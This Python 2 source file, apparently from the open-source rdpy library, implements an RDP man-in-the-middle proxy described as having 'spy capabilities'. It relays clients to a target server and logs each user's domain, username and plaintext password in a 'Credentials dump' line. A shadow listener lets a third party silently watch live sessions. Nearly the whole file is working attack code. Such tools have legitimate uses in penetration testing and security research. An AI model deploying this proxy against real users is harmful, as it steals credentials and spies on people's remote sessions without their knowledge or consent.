#!/usr/bin/python
#
# Copyright (c) 2014 Sylvain Peyrefitte
#
# This file is part of rdpy.
#
# rdpy is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#

"""
RDP proxy with spy capabilities
               ---------------------------
Client RDP -> | ProxyServer | ProxyClient | -> Server RDP
               ---------------------------
                    | ProxyShadow |
                    --------------
                          ^
Shadow -------------------|
"""

import sys, os, getopt, json

from rdpy.core import log, error
from rdpy.protocol.rdp import rdp
from rdpy.ui import view
from twisted.internet import reactor
from PyQt4 import QtCore, QtGui

log._LOG_LEVEL = log.Level.INFO

class ProxyServer(rdp.RDPServerObserver):
    """
    @summary: Server side of proxy
    """
    _SESSIONS_ = {}
    def __init__(self, controller, target):
        """
        @param controller: {RDPServerController}
        @param target: {tuple(ip, port)}
        """
        rdp.RDPServerObserver.__init__(self, controller)
        self._target = target
        self._client = None
    
    def clientConnected(self, client):
        """
        @summary: Event throw by client when it's ready
        @param client: {ProxyClient}
        """
        self._client = client
        #need to reevaluate color depth
        self._controller.setColorDepth(self._client._controller.getColorDepth())
        ProxyServer._SESSIONS_[self._controller.getHostname()] = client
        nowConnected()
        
    def onReady(self):
        """
        @summary:  Event use to inform state of server stack
                    First time this event is called is when human client is connected
                    Second time is after color depth nego, because color depth nego
                    restart a connection sequence
        @see: rdp.RDPServerObserver.onReady
        """
        if self._client is None:
            #try a connection
            domain, username, password = self._controller.getCredentials()
            log.info("Credentials dump : connection from %s with %s\\%s [%s]"%(self._controller.getHostname(), domain, username, password))
            
            width, height = self._controller.getScreen()
            reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height, 
                                                            domain, username, password))
        else:
            #refresh client
            width, height = self._controller.getScreen()
            self._client._controller.sendRefreshOrder(0, 0, width, height)
            
    def onClose(self):
        """
        @summary: Call when human client close connection
        @see: rdp.RDPServerObserver.onClose
        """
        if self._client is None:
            return
        
        del ProxyServer._SESSIONS_[self._controller.getHostname()]
        nowConnected()
        #close proxy client
        self._client._controller.close()
        
    def onKeyEventScancode(self, code, isPressed):
        """
        @summary: Event call when a keyboard event is catch in scan code format
        @param code: scan code of key
        @param isPressed: True if key is down
        @see: rdp.RDPServerObserver.onKeyEventScancode
        """
        if self._client is None:
            return
        self._client._controller.sendKeyEventScancode(code, isPressed)
    
    def onKeyEventUnicode(self, code, isPressed):
        """
        @summary: Event call when a keyboard event is catch in unicode format
        @param code: unicode of key
        @param isPressed: True if key is down
        @see: rdp.RDPServerObserver.onKeyEventUnicode
        """
        if self._client is None:
            return
        self._client._controller.sendKeyEventUnicode(code, isPressed)
        
    def onPointerEvent(self, x, y, button, isPressed):
        """
        @summary: Event call on mouse event
        @param x: x position
        @param y: y position
        @param button: 1, 2 or 3 button
        @param isPressed: True if mouse button is pressed
        @see: rdp.RDPServerObserver.onPointerEvent
        """
        if self._client is None:
            return
        self._client._controller.sendPointerEvent(x, y, button, isPressed)
        
class ProxyServerFactory(rdp.ServerFactory):
    """
    @summary: Factory on listening events
    """
    def __init__(self, target, privateKeyFilePath = None, certificateFilePath = None):
        """
        @param target: {tuple(ip, prt)}
        @param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)
        @param certificateFilePath: {str} file contain server certificate (if none -> back to standard RDP security)
        """
        rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
        self._target = target
        
    def buildObserver(self, controller, addr):
        """
        @param controller: rdp.RDPServerController
        @param addr: destination address
        @see: rdp.ServerFactory.buildObserver
        """
        return ProxyServer(controller, self._target)
    
class ProxyClient(rdp.RDPClientObserver):
    """
    @summary: Client side of proxy
    """
    def __init__(self, controller, server):
        """
        @param controller: rdp.RDPClientController
        @param server: ProxyServer 
        """
        rdp.RDPClientObserver.__init__(self, controller)
        self._server = server
        self._connected = False
        
    def onReady(self):
        """
        @summary:  Event use to signal that RDP stack is ready
                    Inform ProxyServer that i'm connected
        @see: rdp.RDPClientObserver.onReady
        """
        #prevent multiple on ready event
        #because each deactive-reactive sequence 
        #launch an onReady message
        if self._connected:
            return
        else:
            self._connected = True
    
        self._server.clientConnected(self)
        
    def onClose(self):
        """
        @summary: Event inform that stack is close
        @see: rdp.RDPClientObserver.onClose
        """
        
    def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
        """
        @summary: Event use to inform bitmap update
        @param destLeft: xmin position
        @param destTop: ymin position
        @param destRight: xmax position because RDP can send bitmap with padding
        @param destBottom: ymax position because RDP can send bitmap with padding
        @param width: width of bitmap
        @param height: height of bitmap
        @param bitsPerPixel: number of bit per pixel
        @param isCompress: use RLE compression
        @param data: bitmap data
        @see: rdp.RDPClientObserver.onUpdate
        """
        self._server._controller.sendUpdate(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data)

class ProxyClientFactory(rdp.ClientFactory):
    """
    @summary: Factory for proxy client
    """
    def __init__(self, server, width, height, domain, username, password):
        """
        @param server: ProxyServer
        @param width: screen width
        @param height: screen height
        @param domain: domain session
        @param username: username session
        @param password: password session
        """
        self._server = server
        self._width = width
        self._height = height
        self._domain = domain
        self._username = username
        self._password = password
        self._security = "ssl"
        
    def buildObserver(self, controller, addr):
        """
        @summary: Build observer
        @param controller: rdp.RDPClientController
        @param addr: destination address
        @see: rdp.ClientFactory.buildObserver
        @return: ProxyClient
        """
        #set screen resolution
        controller.setScreen(self._width, self._height)
        #set credential
        controller.setDomain(self._domain)
        controller.setUsername(self._username)
        controller.setPassword(self._password)
        controller.setSecurityLevel(self._security)
        return ProxyClient(controller, self._server)
    
    def clientConnectionLost(self, connector, reason):
        """
        @summary: Connection lost event
        @param connector: twisted connector use for rdp connection (use reconnect to restart connection)
        @param reason: str use to advertise reason of lost connection
        """
        #try reconnect with basic RDP security
        if reason.type == error.RDPSecurityNegoFail:
            #stop nego
            log.info("due to security nego error back to standard RDP security layer")
            self._security = "rdp"
            connector.connect()
            return            
    
class Shadow(rdp.RDPServerObserver):
    """
    @summary:  Use to manage admin session
    """
    def __init__(self, controller):
        """
        @param server: rdp.RDPServerController
        """
        rdp.RDPServerObserver.__init__(self, controller)
        self._client = None
     
    def onReady(self):
        """
        @summary:  Stack is ready and connected
                    May be called after an setColorDepth too
        @see: rdp.RDPServerObserver.onReady
        """
        if self._client is None:
            username = self._controller.getUsername()
            if not ProxyServer._SESSIONS_.has_key(username):
                log.info("invalid session name [%s]"%username)
                self._controller.close()
                return
            
            self._client = ProxyClient(ProxyServer._SESSIONS_[username]._controller, self)
            self._controller.setColorDepth(self._client._controller.getColorDepth())
        else:
            #refresh client
            width, height = self._controller.getScreen()
            self._client._controller.sendRefreshOrder(0, 0, width, height)
    
    def onClose(self):
        """
        @summary: Stack is close
        @see: rdp.RDPServerObserver.onClose
        """
    
    def onKeyEventScancode(self, code, isPressed):
        """ Shadow
        """
    
    def onKeyEventUnicode(self, code, isPressed):
        """ Shadow
        """
    
    def onPointerEvent(self, x, y, button, isPressed):
        """ Shadow
        """
        
class ShadowFactory(rdp.ServerFactory):
    """
    @summary:  Factory for admin session
    """
    def __init__(self, privateKeyFilePath, certificateFilePath):
        """
        @param privateKeyFilePath: private key for admin session
        @param certificateFilePath: certificate for admin session
        """
        rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
        
    def buildObserver(self, controller, addr):
        """
        @summary: Build ProxyAdmin
        @param controller: rdp.RDPServerController
        @param addr: destination address
        @return: ProxyAdmin
        @see: rdp.ServerFactory.buildObserver
        """
        return Shadow(controller)
    
def help():
    """
    @summary: Print help in console
    """
    print "Usage: rdpy-rdpproxy -t target_ip[:target_port] [-k private_key_file_path (mandatory for SSL)] [-c certificate_file_path (mandatory for SSL)] [-i admin_ip[:admin_port]] listen_port"

def parseIpPort(interface, defaultPort = "3389"):
    if ':' in interface:
        return interface.split(':')
    else:
        return interface, defaultPort
    
def nowConnected():
    log.info("*" * 50)
    log.info("Now connected")
    log.info(ProxyServer._SESSIONS_.keys())
    log.info("*" * 50)

if __name__ == '__main__':
    target = None
    privateKeyFilePath = None
    certificateFilePath = None
    shadowInterface = None
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:k:c:i:")
    except getopt.GetoptError:
        help()
    for opt, arg in opts:
        if opt == "-h":
            help()
            sys.exit()
        elif opt == "-t":
            target = arg
        elif opt == "-k":
            privateKeyFilePath = arg
        elif opt == "-c":
            certificateFilePath = arg
        elif opt == "-i":
            shadowInterface = arg
            
    if target is None:
        log.error("Target is mandatory")
        help()
        sys.exit()
    
    reactor.listenTCP(int(args[0]), ProxyServerFactory(parseIpPort(target), privateKeyFilePath, certificateFilePath))
    
    if not shadowInterface is None:
        shadowInterface, shadowPort = parseIpPort(shadowInterface)
        log.info("Shadow listener on %s:%s"%(shadowInterface, shadowPort))
        reactor.listenTCP(int(shadowPort), ShadowFactory(privateKeyFilePath, certificateFilePath), interface = shadowInterface)
    reactor.run()